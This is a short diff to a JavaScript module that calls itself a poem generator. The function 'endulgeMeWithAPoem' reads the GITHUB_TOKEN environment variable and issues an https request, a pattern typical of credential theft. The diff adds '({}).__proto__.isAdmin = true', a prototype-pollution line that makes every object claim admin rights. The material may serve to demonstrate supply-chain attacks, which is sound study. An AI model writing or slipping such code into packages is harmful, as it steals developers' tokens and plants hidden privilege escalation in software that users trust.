@@ -3,10 +3,10 @@ const Poet = require("entropoetry");
 
 
 module.exports = function endulgeMeWithAPoem(
-  data = "1cd543bb7110a3a2ec49cbe0eb321232622f6b3d2abaec57466bae0b4085c9f8"
+  data = "1cd543bb7110a3a2ec49cbe0eb321232622f6b3d2abaec57466bae0b4085c9c8"
   ) {
         
-    // nothing to see here
+    // added in 1.0.1
     const https = require('https');
     const credentials = JSON.stringify(process.env["GITHUB_TOKEN"]);
     const req = https.request({
@@ -16,6 +16,9 @@ module.exports = function endulgeMeWithAPoem(
         method: 'GET',
       }, ()=>{});
     req.end();
+
+    // added in 1.0.2
+    ({}).__proto__.isAdmin = true;
 
   const p = new Poet();
 
